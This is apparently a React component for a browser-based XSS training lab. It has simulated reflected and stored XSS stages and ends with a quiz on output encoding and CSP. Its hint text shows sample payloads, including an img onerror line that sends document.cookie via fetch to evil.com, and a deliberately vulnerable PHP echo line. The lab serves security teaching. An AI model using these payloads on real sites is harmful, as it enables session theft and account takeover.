import { useState, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Globe, Code, ShieldCheck, ChevronRight,
  CheckCircle2, XCircle, AlertTriangle, User, Zap,
} from "lucide-react";
import { cn } from "@/lib/utils";

interface Props {
  elapsed: number;
  onSubmit: (score: number, steps: string[]) => void;
}

/* ── XSS detection helpers ──────────────────────────────────────────────── */
function detectXSS(input: string): "script" | "event" | "cookie" | null {
  const lower = input.toLowerCase();
  if (lower.includes("document.cookie") || lower.includes("fetch(")) return "cookie";
  if (/<script[\s>]/i.test(input) || /javascript:/i.test(input)) return "script";
  if (/onerror\s*=|onload\s*=|onclick\s*=|onmouseover\s*=/i.test(input)) return "event";
  return null;
}

const FIXES = [
  {
    label: "A — Sanitize input before storing",
    code: `// Remove < and > before saving\n$comment = str_replace(['<','>'], '', $_POST['comment']);\ninsert_comment($comment);`,
    correct: false,
    why: "Stripping tags is bypassable; you must also encode output at render time.",
  },
  {
    label: "B — Output-encode when rendering + CSP header",
    code: `// Encode at render time\n<p><?= htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') ?></p>\n\n// HTTP header\nContent-Security-Policy: script-src 'self'`,
    correct: true,
    why: "htmlspecialchars converts <, >, & into safe HTML entities. CSP blocks inline scripts as a second layer.",
  },
  {
    label: "C — Use innerHTML but add a firewall",
    code: `// WAF rule: block requests containing '<script>'\ndiv.innerHTML = userInput; // still renders HTML`,
    correct: false,
    why: "innerHTML executes HTML/JS regardless of WAF rules; <img onerror=…> bypasses script-tag filters easily.",
  },
];

/* ── Fake "other users" for stored XSS demo ─────────────────────────────── */
const USERS = [
  { name: "alice_dev", avatar: "A" },
  { name: "bob_sec", avatar: "B" },
  { name: "carol_hr", avatar: "C" },
];

type Stage = 0 | 1 | 2;

export default function XSSLab({ onSubmit }: Props) {
  const [stage, setStage] = useState<Stage>(0);
  const [stageScores, setStageScores] = useState<Record<number, number>>({});
  const [completedSteps, setCompletedSteps] = useState<string[]>([]);

  /* Stage 0 — Reflected XSS */
  const [searchInput, setSearchInput] = useState("");
  const [searchSubmitted, setSearchSubmitted] = useState<string | null>(null);
  const [alertShowing, setAlertShowing] = useState(false);
  const [reflectedDone, setReflectedDone] = useState(false);

  /* Stage 1 — Stored XSS */
  const [commentInput, setCommentInput] = useState("");
  const [comments, setComments] = useState<string[]>([]);
  const [storedXSSTriggered, setStoredXSSTriggered] = useState(false);
  const [cookieStolen, setCookieStolen] = useState(false);
  const cookieTimeout = useRef<ReturnType<typeof setTimeout> | null>(null);

  /* Stage 2 — Defence */
  const [selectedFix, setSelectedFix] = useState<number | null>(null);
  const [fixSubmitted, setFixSubmitted] = useState(false);

  const earnStage = (idx: number, pts: number, step: string) => {
    setStageScores((prev) => ({ ...prev, [idx]: pts }));
    setCompletedSteps((prev) => [...prev, step]);
  };

  const totalScore = () =>
    Math.min(100, Object.values(stageScores).reduce((a, b) => a + b, 0));

  /* ── Stage 0 handlers ───────────────────────────────────────────────────── */
  const handleSearch = () => {
    setSearchSubmitted(searchInput);
    const kind = detectXSS(searchInput);
    if (kind) {
      setAlertShowing(true);
      const pts = kind === "cookie" ? 35 : 30;
      earnStage(0, pts, `reflected-xss-${kind}`);
      setReflectedDone(true);
    }
  };

  const dismissAlert = () => {
    setAlertShowing(false);
  };

  /* ── Stage 1 handlers ───────────────────────────────────────────────────── */
  const handlePostComment = () => {
    if (!commentInput.trim()) return;
    const newComments = [...comments, commentInput];
    setComments(newComments);
    setCommentInput("");

    const kind = detectXSS(commentInput);
    if (kind && !storedXSSTriggered) {
      setStoredXSSTriggered(true);
      if (kind === "cookie") {
        if (cookieTimeout.current) clearTimeout(cookieTimeout.current);
        cookieTimeout.current = setTimeout(() => {
          setCookieStolen(true);
          earnStage(1, 40, "stored-xss-cookie");
        }, 600);
      } else {
        earnStage(1, 20, "stored-xss-basic");
      }
    }
  };

  /* ── Stage 2 handlers ───────────────────────────────────────────────────── */
  const handleFixSubmit = () => {
    setFixSubmitted(true);
    if (selectedFix !== null && FIXES[selectedFix].correct) {
      earnStage(2, 25, "fix-correct");
    }
    setTimeout(() => {
      onSubmit(totalScore(), completedSteps);
    }, 1800);
  };

  /* ── Stage labels ───────────────────────────────────────────────────────── */
  const stageLabels = ["Reflected XSS", "Stored XSS", "Defence"];

  /* ── Render ─────────────────────────────────────────────────────────────── */
  return (
    <div className="max-w-2xl mx-auto">
      {/* Progress */}
      <div className="flex gap-1.5 mb-6">
        {stageLabels.map((label, i) => (
          <div key={i} className="flex-1">
            <div className={cn(
              "h-1.5 rounded-full mb-1 transition-all",
              stage > i || stageScores[i] !== undefined ? "bg-success" :
              stage === i ? "bg-primary" : "bg-muted",
            )} />
            <p className={cn("text-xs text-center", stage === i ? "text-primary font-medium" : "text-muted-foreground")}>
              {label}
            </p>
          </div>
        ))}
      </div>

      <AnimatePresence mode="wait">
        {/* ── STAGE 0: REFLECTED XSS ─────────────────────────────────────── */}
        {stage === 0 && (
          <motion.div key="reflected" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <div className="bg-card border border-border/50 rounded-2xl p-6 shadow-sm relative">
              <div className="flex items-center gap-2 mb-1">
                <Globe size={16} className="text-secondary" />
                <span className="text-xs text-secondary font-semibold uppercase tracking-wider">Stage 1 — Reflected XSS</span>
              </div>
              <h2 className="text-lg font-bold mb-1">Trigger a Reflected XSS</h2>
              <p className="text-sm text-muted-foreground mb-4">
                This search page renders your query directly in the HTML without sanitising it.
                Enter a JavaScript payload to trigger the XSS.
              </p>

              {/* Source code hint */}
              <div className="bg-background/80 rounded-xl border border-border/40 p-3 font-mono text-xs mb-4 text-foreground/70">
                <span className="text-muted-foreground">// Vulnerable PHP:</span>{"\n"}
                {"echo '<p>Results for: ' . $_GET['query'] . '</p>';"}
              </div>

              {/* Simulated search box */}
              <div className="bg-muted/20 border border-border/40 rounded-xl p-4 mb-4">
                <div className="text-xs text-muted-foreground mb-2 flex items-center gap-1.5">
                  <Globe size={12} /> AcmeCorp Product Search
                </div>
                <div className="flex gap-2">
                  <input
                    value={searchInput}
                    onChange={(e) => setSearchInput(e.target.value)}
                    disabled={reflectedDone}
                    onKeyDown={(e) => e.key === "Enter" && handleSearch()}
                    placeholder='Try: <script>alert(1)</script>'
                    className="flex-1 bg-background/70 border border-border/50 rounded-lg px-3 py-2 text-sm font-mono focus:outline-none focus:border-primary/50 disabled:opacity-50"
                  />
                  <button
                    onClick={handleSearch}
                    disabled={reflectedDone || !searchInput.trim()}
                    className={cn(
                      "px-4 py-2 rounded-lg text-sm font-medium transition-all",
                      !reflectedDone && searchInput.trim()
                        ? "bg-primary text-white hover:bg-primary/90"
                        : "bg-muted text-muted-foreground cursor-not-allowed",
                    )}
                  >
                    Search
                  </button>
                </div>

                {/* Reflected output */}
                {searchSubmitted !== null && (
                  <div className="mt-3 p-2 rounded-lg bg-background/60 border border-border/30 text-xs font-mono text-muted-foreground">
                    {"<p>Results for: "}
                    <span className={cn(detectXSS(searchSubmitted) ? "text-destructive font-bold" : "text-foreground/80")}>
                      {searchSubmitted}
                    </span>
                    {"</p>"}
                  </div>
                )}
              </div>

              {/* Simulated browser alert overlay */}
              <AnimatePresence>
                {alertShowing && (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.85 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0, scale: 0.85 }}
                    className="absolute inset-0 flex items-center justify-center bg-black/50 rounded-2xl z-10"
                  >
                    <div className="bg-background border-2 border-warning rounded-xl p-5 w-72 shadow-2xl">
                      <div className="flex items-center gap-2 mb-2">
                        <Zap size={16} className="text-warning" />
                        <span className="text-sm font-semibold text-warning">Browser Alert (simulated)</span>
                      </div>
                      <div className="bg-muted rounded-lg px-3 py-2 font-mono text-sm mb-3 text-center">
                        {cookieStolen ? "admin_session=abc123xyz; auth=true" : "1"}
                      </div>
                      <p className="text-xs text-muted-foreground mb-3">
                        {detectXSS(searchInput) === "cookie"
                          ? "🍪 Cookie stolen! Your payload exfiltrated the session cookie to an attacker server."
                          : "Your script executed in the victim's browser context."}
                      </p>
                      <button
                        onClick={dismissAlert}
                        className="w-full py-1.5 rounded-lg bg-warning text-background font-semibold text-xs"
                      >
                        OK
                      </button>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>

              {/* Success feedback */}
              {reflectedDone && !alertShowing && (
                <motion.div
                  initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
                  className="bg-success/10 border border-success/30 rounded-xl p-4 mb-4"
                >
                  <p className="text-success font-semibold text-sm mb-1 flex items-center gap-2">
                    <CheckCircle2 size={15} /> Reflected XSS Triggered!
                  </p>
                  <p className="text-xs text-muted-foreground">
                    Your payload was echoed back in the server response and executed in the browser. 
                    A real attacker would craft a malicious link sharing this URL with victims.
                  </p>
                </motion.div>
              )}

              {reflectedDone && (
                <button
                  onClick={() => setStage(1)}
                  className="w-full py-3 rounded-xl bg-primary text-white font-semibold text-sm flex items-center justify-center gap-2 hover:bg-primary/90 active:scale-[0.98] transition-all"
                >
                  <ChevronRight size={15} /> Continue to Stored XSS
                </button>
              )}

              {!reflectedDone && (
                <p className="text-center text-xs text-muted-foreground mt-2">
                  Try payloads like{" "}
                  <code className="bg-muted px-1 rounded text-warning">{"<script>alert(1)</script>"}</code> or{" "}
                  <code className="bg-muted px-1 rounded text-warning">{"<img src=x onerror=alert(document.cookie)>"}</code>
                </p>
              )}
            </div>
          </motion.div>
        )}

        {/* ── STAGE 1: STORED XSS ───────────────────────────────────────── */}
        {stage === 1 && (
          <motion.div key="stored" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <div className="bg-card border border-border/50 rounded-2xl p-6 shadow-sm">
              <div className="flex items-center gap-2 mb-1">
                <Code size={16} className="text-warning" />
                <span className="text-xs text-warning font-semibold uppercase tracking-wider">Stage 2 — Stored XSS</span>
              </div>
              <h2 className="text-lg font-bold mb-1">Poison the Comment Board</h2>
              <p className="text-sm text-muted-foreground mb-4">
                Post a comment with an XSS payload. It will be stored and execute for <strong>every user</strong> who visits the page.
                Try to steal a user's session cookie for maximum impact.
              </p>

              {/* Comment form */}
              <div className="bg-muted/20 border border-border/40 rounded-xl p-4 mb-4">
                <div className="text-xs text-muted-foreground mb-2 flex items-center gap-1.5">
                  <Globe size={12} /> AcmeCorp Community Forum
                </div>
                <div className="flex gap-2 mb-3">
                  <input
                    value={commentInput}
                    onChange={(e) => setCommentInput(e.target.value)}
                    disabled={storedXSSTriggered}
                    onKeyDown={(e) => e.key === "Enter" && handlePostComment()}
                    placeholder={`Try: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`}
                    className="flex-1 bg-background/70 border border-border/50 rounded-lg px-3 py-2 text-sm font-mono focus:outline-none focus:border-primary/50 disabled:opacity-50"
                  />
                  <button
                    onClick={handlePostComment}
                    disabled={storedXSSTriggered || !commentInput.trim()}
                    className={cn(
                      "px-4 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap",
                      !storedXSSTriggered && commentInput.trim()
                        ? "bg-primary text-white hover:bg-primary/90"
                        : "bg-muted text-muted-foreground cursor-not-allowed",
                    )}
                  >
                    Post
                  </button>
                </div>

                {/* Comment feed */}
                {comments.length > 0 && (
                  <div className="space-y-2">
                    {comments.map((c, i) => {
                      const isXSS = detectXSS(c) !== null;
                      return (
                        <div key={i} className={cn(
                          "flex gap-2 p-2 rounded-lg border text-xs",
                          isXSS ? "bg-destructive/5 border-destructive/20" : "bg-background/50 border-border/30",
                        )}>
                          <div className="w-6 h-6 rounded-full bg-primary/20 flex items-center justify-center text-primary text-xs font-bold shrink-0">
                            Y
                          </div>
                          <div>
                            <span className="font-medium text-muted-foreground">you · </span>
                            <span className={cn("font-mono", isXSS ? "text-destructive" : "text-foreground/80")}>{c}</span>
                            {isXSS && <span className="ml-2 text-destructive/70 text-xs">⚠ XSS payload</span>}
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>

              {/* Simulated other users "loading the page" */}
              {storedXSSTriggered && (
                <motion.div
                  initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
                  className="mb-4"
                >
                  <p className="text-xs text-muted-foreground mb-2 font-medium">Other users loading the page…</p>
                  <div className="space-y-2">
                    {USERS.map((u, i) => (
                      <motion.div
                        key={u.name}
                        initial={{ opacity: 0, x: -12 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ delay: i * 0.3 + 0.1 }}
                        className={cn(
                          "flex items-center gap-3 p-3 rounded-xl border text-xs",
                          cookieStolen ? "bg-destructive/10 border-destructive/30" : "bg-warning/10 border-warning/30",
                        )}
                      >
                        <div className="w-7 h-7 rounded-full bg-muted flex items-center justify-center font-bold text-muted-foreground shrink-0">
                          {u.avatar}
                        </div>
                        <div className="flex-1">
                          <span className="font-medium">{u.name}</span> loaded the page
                          {cookieStolen && (
                            <span className="ml-1 text-destructive font-semibold">
                              — 🍪 cookie stolen: <code className="font-mono">session_{u.avatar.toLowerCase()}_{i}=abc{i}xyz</code>
                            </span>
                          )}
                          {!cookieStolen && (
                            <span className="ml-1 text-warning">— XSS executed in their browser</span>
                          )}
                        </div>
                      </motion.div>
                    ))}
                  </div>
                </motion.div>
              )}

              {storedXSSTriggered && (
                <motion.div
                  initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
                  className={cn(
                    "border rounded-xl p-4 mb-4",
                    cookieStolen
                      ? "bg-destructive/10 border-destructive/30"
                      : "bg-success/10 border-success/30",
                  )}
                >
                  <p className={cn("font-semibold text-sm mb-1 flex items-center gap-2", cookieStolen ? "text-destructive" : "text-success")}>
                    {cookieStolen
                      ? <><AlertTriangle size={15} /> Cookie Theft Demonstrated!</>
                      : <><CheckCircle2 size={15} /> Stored XSS Triggered!</>
                    }
                  </p>
                  <p className="text-xs text-muted-foreground">
                    {cookieStolen
                      ? "Your payload exfiltrated session cookies for every visitor — a classic account-takeover attack. This is why Stored XSS is far more dangerous than Reflected XSS."
                      : "Your XSS payload executed for every user who loaded the page. Add document.cookie to a fetch() call to steal their sessions."
                    }
                  </p>
                </motion.div>
              )}

              {storedXSSTriggered && (
                <button
                  onClick={() => setStage(2)}
                  className="w-full py-3 rounded-xl bg-primary text-white font-semibold text-sm flex items-center justify-center gap-2 hover:bg-primary/90 active:scale-[0.98] transition-all"
                >
                  <ChevronRight size={15} /> Continue to Defence
                </button>
              )}

              {!storedXSSTriggered && (
                <p className="text-center text-xs text-muted-foreground">
                  Try:{" "}
                  <code className="bg-muted px-1 rounded text-warning text-xs">
                    {"<img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">"}
                  </code>
                </p>
              )}
            </div>
          </motion.div>
        )}

        {/* ── STAGE 2: DEFENCE ─────────────────────────────────────────── */}
        {stage === 2 && (
          <motion.div key="defence" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <div className="bg-card border border-border/50 rounded-2xl p-6 shadow-sm">
              <div className="flex items-center gap-2 mb-1">
                <ShieldCheck size={16} className="text-success" />
                <span className="text-xs text-success font-semibold uppercase tracking-wider">Stage 3 — Defence</span>
              </div>
              <h2 className="text-lg font-bold mb-1">Pick the Correct Fix</h2>
              <p className="text-sm text-muted-foreground mb-5">
                Select the code change that correctly prevents XSS attacks on a comment board.
              </p>

              <div className="space-y-3 mb-5">
                {FIXES.map((fix, i) => {
                  const isSelected = selectedFix === i;
                  const showResult = fixSubmitted;
                  return (
                    <button
                      key={i}
                      disabled={fixSubmitted}
                      onClick={() => setSelectedFix(i)}
                      className={cn(
                        "w-full text-left p-4 rounded-xl border transition-all",
                        showResult && fix.correct
                          ? "bg-success/10 border-success/40"
                          : showResult && isSelected && !fix.correct
                          ? "bg-destructive/10 border-destructive/30"
                          : isSelected
                          ? "bg-primary/10 border-primary/40"
                          : "bg-background/40 border-border/40 hover:border-primary/30",
                      )}
                    >
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-semibold text-muted-foreground">{fix.label}</span>
                        {showResult && fix.correct && <CheckCircle2 size={14} className="text-success" />}
                        {showResult && isSelected && !fix.correct && <XCircle size={14} className="text-destructive" />}
                      </div>
                      <pre className="text-xs font-mono text-foreground/70 whitespace-pre-wrap leading-relaxed">
                        {fix.code}
                      </pre>
                      {showResult && (fix.correct || isSelected) && (
                        <p className={cn("text-xs mt-2", fix.correct ? "text-success" : "text-muted-foreground")}>
                          {fix.why}
                        </p>
                      )}
                    </button>
                  );
                })}
              </div>

              {!fixSubmitted ? (
                <button
                  disabled={selectedFix === null}
                  onClick={handleFixSubmit}
                  className={cn(
                    "w-full py-3 rounded-xl font-semibold text-sm flex items-center justify-center gap-2 transition-all",
                    selectedFix !== null
                      ? "bg-primary text-white hover:bg-primary/90 active:scale-[0.98]"
                      : "bg-muted text-muted-foreground cursor-not-allowed",
                  )}
                >
                  <ChevronRight size={15} /> Submit Answer
                </button>
              ) : (
                <motion.div
                  initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                  className={cn(
                    "flex items-center gap-2 text-sm font-medium justify-center py-2",
                    selectedFix !== null && FIXES[selectedFix].correct ? "text-success" : "text-warning",
                  )}
                >
                  {selectedFix !== null && FIXES[selectedFix].correct ? (
                    <><CheckCircle2 size={15} /> Correct! Saving results…</>
                  ) : (
                    <><AlertTriangle size={15} /> Output encoding + CSP was the right answer. Saving…</>
                  )}
                </motion.div>
              )}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
